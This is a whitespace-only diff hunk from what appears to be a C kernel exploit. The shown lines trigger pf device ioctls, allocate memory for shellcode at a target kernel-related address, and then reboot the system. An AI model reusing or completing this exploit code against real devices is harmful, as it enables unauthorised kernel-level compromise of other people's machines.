@@ -178,8 +178,7 @@ int main(int argc, char* argv[])
     ioctl(pffd, DIOCBEGINADDRS, &pp);
     ioctl(pffd, DIOCSTOP);
     close(pffd);
-    
-    
+
     // Allocate shellcode
     vm_address_t allocation = target;
     kern_return_t kr = vm_allocate(mach_task_self(), &allocation, kernel_code_size_page, FALSE);
@@ -227,7 +226,7 @@ int main(int argc, char* argv[])
     
     sleep(4);
     run((char *[]) {"/sbin/reboot", NULL}, NULL);
-    
+
     return 0;
 }
 
